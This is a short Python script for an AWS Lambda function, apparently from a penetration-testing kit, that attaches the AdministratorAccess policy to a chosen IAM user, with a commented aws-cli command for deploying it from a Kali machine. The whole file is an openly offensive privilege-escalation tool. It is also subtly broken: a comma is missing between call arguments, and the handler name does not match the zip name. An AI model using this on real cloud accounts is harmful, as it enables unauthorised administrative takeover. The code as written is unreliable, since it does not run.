#lambda creation command
#aws lambda create-function --function-name my_function --runtime python3.6 --role <ROLE_ARN> --handler lamdaprivesc.lambda_handler --zip-file fileb:///home/kali/lamdaprivesc.zip --region us-east-1 --profile <PROFILE>
#ZIP FILE AND NAME lambdaprivesc.zip and place in kali home directory
import boto3

def lambda_handler(event, context):

    client = boto3.client('iam')

    response = client.attach_user_policy(

    UserName='EXAMPLE_USERNAME' #PUT TARGET USER TO PRIV ESC HERE - USERNAME NOT ARN

    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')

    return response